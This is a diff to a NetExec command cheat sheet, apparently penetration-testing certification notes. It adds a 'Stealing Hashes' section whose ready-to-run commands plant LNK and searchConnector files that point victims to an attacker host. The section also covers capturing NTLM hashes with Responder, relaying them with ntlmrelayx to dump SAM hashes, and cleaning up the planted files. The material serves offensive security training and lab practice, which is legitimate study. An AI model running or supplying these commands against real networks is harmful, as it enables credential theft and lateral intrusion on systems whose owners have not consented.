@@ -198,7 +198,7 @@ nxc smb $IP -u [user] -p [pass] --share [sharename] --get-file [remote file] [sa
 nxc smb $IP -u [user] -p [pass] --share [sharename] --put-file [local file] [remote file]
 ```
 ### Spider_plus
-> Use this to exclude shares like IPC$,print$, NETLOGON, SYVOL
+> Use this to exclude shares like IPC$,print$, NETLOGON, SYSVOL
 ```bash
 # Exclude directories
 nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
@@ -246,6 +246,46 @@ sudo chisel client $IP:8080 socks
 * Test
 ```bash
 sudo proxychains4 -q nxc smb $IP 0u -u [user] -p [pass] --shares
+```
+### Stealing Hashes
+#### Slinky Module
+> Creates a LNK file with the icon attribute pointing to an attack host  
+> 2 mandatory options - Server (Attack host) and Name (Arbitrary file name) and one optional option - Cleanup  
+> Requires a writable share  
+* Execute the attack
+```bash
+proxychains4 -q nxc smb $IP -u [user] -p [pass] -M slinky -o SERVER=[AttackerIP] NAME=[Attractive Name]
+```
+* Start Responder to capture the hashes
+> Make sure the smb option is enabled in responder
+```bash
+sudo responder -I tun0
+```
+* Crack the hash, if crackable
+#### NTLM Relay
+> Relay the NTLMv2 hash directly to other machines with SMB Signing disabled. See [Basic SMB Recon](https://github.com/Chvxt3r/HackTools/blob/main/cert_notes/htb/nxc.md#basic-smb-recon] for list generation
+* After starting responder, start impacket-ntlmrelayx(ntlmrelayx.py)
+```bash
+sudo proxychains4 -q impacket-ntlmrelayx -tf [relayfile.txt] -smb2support --no-http
+```
+> If a user has permissions(admin), ntlmrelayx will automatically dump the sam and provide local hashes.
+#### Cleanup
+* Removing the LNK file
+```bash
+proxychains4 -q nxc smb $IP -u [user] -p [pass] -M slinky -o NAME=[LNK name] CLEANUP=YES
+```
+#### drop-sc Module
+> Uses '.searchConnector-ms' and '.library-ms' files rather than LNK files.  
+> Required Options: URL (URL must be escaped with double backslashes) ex: URL=\\\\10.10.14.33\\secret  
+> Optional: SHARE=[sharename], FILENAME=[filename], CLEANUP=True  
+* Execute the drop-sc
+```bash
+proxychains4 nxc smb $IP -u [user] -p [pass] -M drop-sc URL=\\\\[AttackerIP]\\[file] SHARE=[share name] FILENAME=[filename]
+```
+* Drop-sc can be relayed the same as LNK above
+* Cleanup
+```bash
+proxychains4 -q nxc smb $IP -u [user] -p [pass] -M drop-sc -o CLEANUP=True FILENAME=[filename]
 ```
 
 ## Admin Credentialed enumeration
